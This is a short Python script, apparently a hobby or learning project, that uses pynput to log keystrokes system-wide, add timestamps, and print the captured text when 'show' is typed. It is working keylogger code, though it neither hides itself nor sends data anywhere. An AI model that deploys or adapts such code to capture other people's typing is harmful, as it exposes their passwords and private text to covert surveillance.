from pynput import keyboard
from datetime import datetime
current_time = datetime.now().strftime("%d/%m/%Y %H:%M")
my_list = []

def on_press(key):
    global my_list
    try:
        tempKey = str(key.char)
    except AttributeError:
        tempKey = key
        if tempKey == keyboard.Key.backspace:
            my_list = my_list[:-1]
            return
        elif tempKey == keyboard.Key.enter:
            tempKey = '\n'
        elif tempKey == keyboard.Key.space:
            tempKey = " "


        else:
            tempKey = str(tempKey)
    add_to_file(tempKey)

def add_to_file(sing):
    global current_time, my_list
    tempTime = datetime.now().strftime("%d/%m/%Y %H:%M")
    if tempTime != current_time:
        my_list.append("\n***** " + tempTime + " *****\n")
    my_list.append(sing)
    if my_list[-4:] == ["s", "h", "o", "w"]:
        print("\n***** " + current_time + " *****")
        print("".join(my_list[:-4]))
        my_list = []

listener = keyboard.Listener(on_press = on_press)
listener.start()
listener.join()











